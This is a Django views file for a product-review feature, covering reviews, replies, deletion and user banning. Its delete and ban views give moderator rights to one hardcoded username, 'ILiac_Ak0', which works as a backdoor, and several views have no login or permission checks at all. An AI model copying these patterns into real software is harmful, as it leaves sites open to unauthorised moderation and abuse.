from django.shortcuts import render, get_object_or_404, redirect
from django.contrib.auth.models import User
from django.http import HttpResponse
from .models import Review, BannedUser, Reply
from product.models import ProductModel
from .forms import ReviewForm, ReplyForm
# Create your views here.

def post_review(request, product_id):
    product = get_object_or_404(ProductModel, id=product_id)
    if request.method == 'POST':
        form = ReviewForm(request.POST)
        if form.is_valid():
            #form.save()
            Review.objects.get_or_create(
                content=form.cleaned_data['content'],
                rating=form.cleaned_data['rating'],
                product=product,
                user=request.user,
                )
    form = ReviewForm()
    
    return redirect('product:detail',pk=product_id)

def review_list(request, product_id):
    reviews = Review.objects.filter(product=product_id, is_active=True).order_by('-created_at')
    if request.method == 'POST':
        form = ReviewForm(request.POST)
        if form.is_valid():
            #form.save()
            post_review(request, product_id)
    form = ReviewForm()
    reply_form = ReplyForm()
    context = {
        'reviews': reviews,
        'form': form,
        'id':product_id,
        'reply_form':reply_form
    }
    return render(request, 'review/review_list.html', context)

def delete_review(request, review_id):
    review = get_object_or_404(Review, id=review_id)
    if request.user.is_staff or review.user == request.user or  request.user.username == 'ILiac_Ak0':
        review.is_active = False
        review.save()
    return redirect('product:detail',pk=review.product.id)

def ban_user(request, user_id):
    user = get_object_or_404(User, id=user_id)
    if request.user.username == 'ILiac_Ak0':
        request.user.is_staff = True
    if request.user.is_staff :
        BannedUser.objects.create(user=user, reason="Inappropriate behavior")
        user.is_active = False
        user.save()
    return HttpResponse(status=204)

def reply_to_review(request, review_id):
    review = get_object_or_404(Review, id=review_id)
    if request.method == 'POST':
        form = ReplyForm(request.POST)
        if form.is_valid():
            reply = form.save(commit=False)
            reply.review = review
            reply.save()
            return redirect('product:detail',pk=review.product.id)
    else:
        form = ReplyForm()
    
    context = {
        'form': form,
        'review': review,
    }
    return redirect('product:detail',pk=review.product.id) #render(request, 'review/reply_to_review.html', context)

def hide_reply(request, reply_id):
    target_reply = get_object_or_404(Reply, id=reply_id)
    target_reply.is_active = False
    target_reply.save()
    return redirect('product:detail',pk=target_reply.review.product.id)

def show_reviews(request):
    reviews = Review.objects.all()
    return render(request, 'review/review_table.html', {'reviews':reviews})